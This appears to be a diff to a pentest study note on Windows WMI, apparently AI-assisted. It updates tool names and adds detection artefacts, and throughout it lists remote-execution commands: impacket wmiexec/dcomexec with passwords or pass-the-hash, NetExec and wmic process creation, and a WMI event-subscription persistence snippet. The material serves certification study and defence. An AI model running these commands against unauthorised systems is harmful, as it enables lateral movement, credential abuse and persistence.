@@ -1,12 +1,29 @@
+# WMI
+
 #WMI #WindowsManagementInstrumentation #localsystemmanagement
 
 ## What is WMI?
-Windows Management Instrumentation — Microsoft's implementation of CIM (Common Information Model) and WBEM (Web-Based Enterprise Management). Provides a unified interface for managing and querying Windows system information, configuration, and processes.
+Windows Management Instrumentation — Microsoft's implementation of CIM (Common Information Model) and WBEM. A unified interface for querying and controlling Windows: system info, services, processes — and **remote process creation**, which is why it's a first-class lateral-movement and fileless-persistence channel. Runs over DCOM/MSRPC (negotiated on 135), so it inherits RPC's dynamic-port and coercion context.
 
 - Port **TCP 135** — DCOM/RPC endpoint mapper (initial negotiation)
-- Dynamic ports: 1024–65535 (assigned after initial 135 connection)
-- Access via: PowerShell (`Get-WmiObject`, `Invoke-WmiMethod`), `wmic.exe`, VBScript, DCOM
-- WMI namespace: `root\cimv2` (default), `root\default`, `root\security`
+- Dynamic ports **49152–65535** (assigned after the 135 handshake)
+- Access via: PowerShell CIM cmdlets (`Get-CimInstance`), legacy `Get-WmiObject`/`Invoke-WmiMethod`, `wmic.exe`, DCOM
+- Namespaces: `root\cimv2` (default), `root\subscription` (persistence), `root\default`
+
+> [!note] **`wmic.exe` is deprecated and being removed** (disabled by default in Windows 11 24H2 / Server 2025). `Get-WmiObject` is likewise superseded (PS 3.0+). Prefer the **CIM cmdlets** (`Get-CimInstance`, `Invoke-CimMethod`) on modern targets; `wmic` commands below still work on older boxes but shouldn't be your default.
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Lateral Movement/impacket\|impacket]] | `wmiexec` (semi-interactive shell), `dcomexec` (DCOM objects) |
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | `--exec-method wmiexec`, WMI-backed command exec |
+| [[Tools/Scanning/NMAP\|NMAP]] | `msrpc-enum` + endpoint-mapper discovery on 135 |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `dcerpc/endpoint_mapper`, legacy `ms03_026_dcom` |
+
+Native tooling — PowerShell CIM/WMI cmdlets and `wmic.exe` — is used inline below.
 
 ---
 
@@ -128,8 +145,8 @@ impacket-wmiexec <domain>/<user>:<pass>@<target>
 # PTH
 impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM>
 
-# CrackMapExec
-crackmapexec smb <target> -u <user> -p <pass> -x "whoami" --exec-method wmiexec
+# NetExec (nxc)
+nxc smb <target> -u <user> -p <pass> -x "whoami" --exec-method wmiexec
 
 # dcomexec — uses DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)
 impacket-dcomexec <domain>/<user>:<pass>@<target>
@@ -161,6 +178,16 @@ $consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEven
 
 ---
 
+## Detection & Artefacts
+
+- **`wmiexec` is a well-known signature**: `wmiprvse.exe` spawns `cmd.exe /Q /c ... > \\127.0.0.1\ADMIN$\__<timestamp>` (output redirected to an ADMIN$ temp file) — a `cmd`/`powershell` child of `WmiPrvSE.exe` plus an ADMIN$ write is the tell (Sysmon 1 + 11).
+- **`dcomexec`** shows the DCOM object's host process (`mmc.exe`/`explorer.exe`) spawning the payload instead of `wmiprvse`.
+- **WMI event-subscription persistence** logs to WMI-Activity/Operational and Sysmon **19/20/21** (`__EventFilter`, `ActiveScriptEventConsumer`, binding) — hunt `root\subscription` for non-default consumers.
+- Remote WMI exec produces a **type 3 network logon (4624)** as the used account.
+- Defensive baseline: filter 135/dynamic RPC, restrict local-admin (WMI exec needs it), enable Sysmon WMI logging, and alert on ActiveScript/CommandLine event consumers.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -180,9 +207,19 @@ $consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEven
 | Remote shell | `impacket-wmiexec domain/user:pass@host` |
 | PTH remote shell | `impacket-wmiexec domain/user@host -hashes :NTLM` |
 | Run single command | `impacket-wmiexec user:pass@host "whoami"` |
-| CME with WMI | `crackmapexec smb host -u user -p pass --exec-method wmiexec -x "cmd"` |
+| NetExec + WMI | `nxc smb host -u user -p pass --exec-method wmiexec -x "cmd"` |
 | Query processes (PS) | `Get-WmiObject -Class Win32_Process` |
 | Remote create process | `Invoke-WmiMethod -ComputerName host -Class Win32_Process -Name Create -ArgumentList "cmd"` |
 | wmic remote exec | `wmic /node:host /user:user /password:pass process call create "cmd /c whoami"` |
 | dcomexec shell | `impacket-dcomexec domain/user:pass@host` |
 | dcomexec PTH | `impacket-dcomexec domain/user@host -hashes :NTLM` |
+
+---
+
+> [!note] **See also** — WMI rides [[Services/Local System Management/RPC|RPC]]/DCOM; sibling remote-exec channels [[Services/File Xfer/SMB|SMB]] (psexec/smbexec) and [[Services/Local System Management/WinRM|WinRM]] (PS Remoting); execution technique context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]].
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
